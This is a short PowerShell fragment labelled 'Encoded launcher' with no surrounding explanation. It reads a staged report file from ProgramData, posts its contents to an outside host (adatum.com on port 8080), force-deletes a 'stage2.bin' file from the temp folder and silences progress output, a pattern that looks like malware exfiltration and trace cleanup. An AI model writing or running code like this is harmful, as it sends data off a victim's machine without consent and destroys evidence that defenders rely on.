
# Encoded launcher
$BodyText = Get-Content -Path 'C:\ProgramData\stage_report.json' -Raw
Invoke-RestMethod -Uri 'http://adatum.com:8080/upload' -Method Post -Body $BodyText -ContentType "application/json"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ProgressPreference = "SilentlyContinue"
